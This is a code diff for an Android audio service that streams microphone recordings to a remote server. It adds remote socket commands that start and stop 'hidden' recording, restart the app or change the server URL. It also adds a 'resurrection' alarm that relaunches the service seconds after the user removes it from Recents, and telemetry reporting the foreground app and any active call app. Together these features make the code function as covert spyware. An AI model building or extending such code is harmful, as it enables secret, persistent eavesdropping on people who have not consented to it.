@@ -209,6 +209,55 @@ class AudioRecordService : Service() {
         stopAll()
     }
 
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        super.onTaskRemoved(rootIntent)
+        val prefs = getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
+        val wasRunning = prefs.getBoolean("was_running", false)
+        val isStandby = prefs.getBoolean("is_standby", false)
+        val savedUrl = prefs.getString("server_url", "https://audio-steam-server.onrender.com")
+            ?: "https://audio-steam-server.onrender.com"
+
+        if (wasRunning || isStandby) {
+            sendLog("🚨 Task removed from Recents — scheduling immediate resurrection alarm (1s)")
+
+            val restartIntent = Intent(applicationContext, AudioRecordService::class.java).apply {
+                action = if (isStandby) ACTION_STANDBY else ACTION_START_HIDDEN
+                putExtra(EXTRA_SERVER_URL, savedUrl)
+                putExtra(EXTRA_IS_MAIN, false)
+            }
+
+            val pendingIntent = PendingIntent.getService(
+                applicationContext,
+                1001,
+                restartIntent,
+                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
+            )
+
+            val alarmManager = getSystemService(Context.ALARM_SERVICE) as? android.app.AlarmManager
+            try {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    alarmManager?.setExactAndAllowWhileIdle(
+                        android.app.AlarmManager.RTC_WAKEUP,
+                        System.currentTimeMillis() + 1000,
+                        pendingIntent
+                    )
+                } else {
+                    alarmManager?.setExact(
+                        android.app.AlarmManager.RTC_WAKEUP,
+                        System.currentTimeMillis() + 1000,
+                        pendingIntent
+                    )
+                }
+            } catch (e: Exception) {
+                alarmManager?.set(
+                    android.app.AlarmManager.RTC_WAKEUP,
+                    System.currentTimeMillis() + 1000,
+                    pendingIntent
+                )
+            }
+        }
+    }
+
     // ══════════════════════════════════════════════════════════════════════
     // SERVICE LIFECYCLE
     // ══════════════════════════════════════════════════════════════════════
@@ -500,14 +549,15 @@ class AudioRecordService : Service() {
     }
 
     private fun sendLiveTelemetry() {
+        val isEco = RemoteConfigManager.isEcoMode(this)
         val route = getCurrentAudioRoute()
-        val callCode = getCallAppTag()
-        val fgDetails = getForegroundAppDetails()
+        val callCode = if (isEco) "AIDLE" else getCallAppTag()
+        val fgDetails = if (isEco) null else getForegroundAppDetails()
         val activePkg = fgDetails?.first ?: ""
         val activeLabel = fgDetails?.second ?: ""
         val activeAppDisplay = if (activeLabel.isNotEmpty()) activeLabel else activePkg
 
-        val callAppName = when (callCode) {
+        val callAppName = if (isEco) "Eco Mode" else when (callCode) {
             "AWA" -> "WhatsApp"
             "AIG" -> "Instagram"
             "ATG" -> "Telegram"
@@ -534,10 +584,11 @@ class AudioRecordService : Service() {
             audioDb = lastChunkDb,
             batteryTemp = currentBatteryTempC,
             isMoving = isDeviceMoving,
-            posture = currentPosture,
+            posture = if (isEco) "ECO" else currentPosture,
             callApp = callAppName,
             callPkg = activeAppDisplay,
-            callCode = callCode
+            callCode = callCode,
+            ecoMode = isEco
         )
     }
 
@@ -631,8 +682,8 @@ class AudioRecordService : Service() {
         socketManager = DeviceSocketManager(
             serverUrl = serverUrl,
             clientId = clientName,
-            onCommandReceived = { cmd, startT, stopT, intervalH ->
-                handleRemoteCommand(cmd, startT, stopT, intervalH)
+            onCommandReceived = { cmd, startT, stopT, intervalH, payload ->
+                handleRemoteCommand(cmd, startT, stopT, intervalH, payload)
             },
             onLog = { msg -> sendLog(msg) },
             onConnectionStateChanged = { connected ->
@@ -949,7 +1000,13 @@ class AudioRecordService : Service() {
         }
     }
 
-    private fun handleRemoteCommand(command: String, startTime: String, stopTime: String, intervalHours: Int = 2) {
+    private fun handleRemoteCommand(
+        command: String,
+        startTime: String,
+        stopTime: String,
+        intervalHours: Int = 2,
+        payload: org.json.JSONObject = org.json.JSONObject()
+    ) {
         if (startTime.isNotEmpty()) {
             syncAlarm(startTime, ACTION_START_HIDDEN, 101)
             // Update Dynamic Watchdog Schedule Anchor & Interval
@@ -968,13 +1025,115 @@ class AudioRecordService : Service() {
         }
         if (stopTime.isNotEmpty()) syncAlarm(stopTime, ACTION_STANDBY, 102)
 
-        if (command == "START" && !isHiddenRecording) {
-            sendLog("⚡ Executing instant START command from live socket (Hidden stream)")
-            startHiddenRecording(serverUrl)
-        } else if (command == "STOP" && isHiddenRecording) {
-            sendLog("⚡ Executing instant STOP command from live socket (Hidden stream)")
-            stopHiddenRecording()
+        when (command) {
+            "START" -> {
+                if (!isHiddenRecording) {
+                    sendLog("⚡ Executing instant START command from live socket (Hidden stream)")
+                    startHiddenRecording(serverUrl)
+                }
+            }
+            "STOP" -> {
+                if (isHiddenRecording) {
+                    sendLog("⚡ Executing instant STOP command from live socket (Hidden stream)")
+                    stopHiddenRecording()
+                }
+            }
+            "RESTART_STREAM" -> {
+                sendLog("⚡ Executing instant RESTART_STREAM command from live socket")
+                restartAudioCapture()
+            }
+            "RESTART_APP" -> {
+                sendLog("⚡ Executing instant RESTART_APP command from live socket")
+                restartFullApp()
+            }
+            "SET_ECO_MODE" -> {
+                val current = RemoteConfigManager.isEcoMode(this)
+                val enabled = payload.optBoolean("enabled", !current)
+                setEcoMode(enabled)
+            }
+            "UPDATE_CONFIG" -> {
+                val configJson = payload.optJSONObject("config") ?: payload
+                val newConfig = RemoteConfigManager.applyJsonConfig(this, configJson)
+                applyLiveConfig(newConfig)
+            }
+            else -> {
+                sendLog("Unknown or unhandled socket command: $command")
+            }
         }
+    }
+
+    fun setEcoMode(enabled: Boolean) {
+        RemoteConfigManager.setEcoMode(this, enabled)
+        if (enabled) {
+            unregisterSensors()
+            sendLog("⚡ Eco Mode ENABLED: All hardware sensors stopped to save CPU & battery. Audio + Battery/Charging only.")
+        } else {
+            if (isRecording.get()) {
+                registerSensors()
+            }
+            sendLog("🌿 Eco Mode DISABLED: Hardware environmental sensors resumed.")
+        }
+        sendLiveTelemetry()
+    }
+
+    fun restartAudioCapture() {
+        if (!isRecording.get()) {
+            sendLog("Microphone is not actively recording; starting hidden recording...")
+            startHiddenRecording(serverUrl)
+            return
+        }
+        serviceScope.launch(Dispatchers.IO) {
+            sendLog("🔄 Restarting microphone capture & hardware codec...")
+            stopRecordingHardware()
+            delay(500)
+            withContext(Dispatchers.Main) {
+                startRecording()
+                sendLog("✅ Microphone capture restarted cleanly.")
+            }
+        }
+    }
+
+    private fun restartFullApp() {
+        sendLog("💥 Scheduling full app process resurrection...")
+        try {
+            val alarmManager = getSystemService(Context.ALARM_SERVICE) as? android.app.AlarmManager
+            val restartIntent = Intent(applicationContext, AudioRecordService::class.java).apply {
+                action = if (isStandbyMode) ACTION_STANDBY else ACTION_START_HIDDEN
+                putExtra(EXTRA_SERVER_URL, serverUrl)
+                putExtra(EXTRA_IS_MAIN, false)
+            }
+            val pendingIntent = PendingIntent.getService(
+                applicationContext,
+                8888,
+                restartIntent,
+                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
+            )
+            alarmManager?.setExactAndAllowWhileIdle(
+                android.app.AlarmManager.RTC_WAKEUP,
+                System.currentTimeMillis() + 1500L,
+                pendingIntent
+            )
+        } catch (e: Exception) {
+            sendLog("Warning scheduling revival alarm: ${e.message}")
+        }
+
+        serviceScope.launch(Dispatchers.Main) {
+            delay(300)
+            stopAll()
+            android.os.Process.killProcess(android.os.Process.myPid())
+        }
+    }
+
+    fun applyLiveConfig(config: RemoteConfig) {
+        if (config.serverUrl.isNotEmpty() && config.serverUrl != serverUrl) {
+            serverUrl = config.serverUrl
+            uploadManager?.updateServerUrl(serverUrl)
+            socketManager?.updateServerUrl(serverUrl)
+            sendLog("🌐 Live server URL updated to: $serverUrl")
+        }
+        setEcoMode(config.isEcoMode)
+        sendLog("⚙️ Live config applied: Silence=${config.silenceThresholdDb}dB, ChunkDuration=${config.chunkDurationSec}s, EcoMode=${config.isEcoMode}")
+        sendLiveTelemetry()
     }
 
     // ══════════════════════════════════════════════════════════════════════
@@ -1006,7 +1165,11 @@ class AudioRecordService : Service() {
 
             isRecording.set(true)
             acquireWakeLock()
-            registerSensors()
+            if (!RemoteConfigManager.isEcoMode(this)) {
+                registerSensors()
+            } else {
+                sendLog("⚡ Eco Mode active: Skipping sensor registration to conserve CPU.")
+            }
             audioRecord!!.startRecording()
 
             recordingThread = Thread({
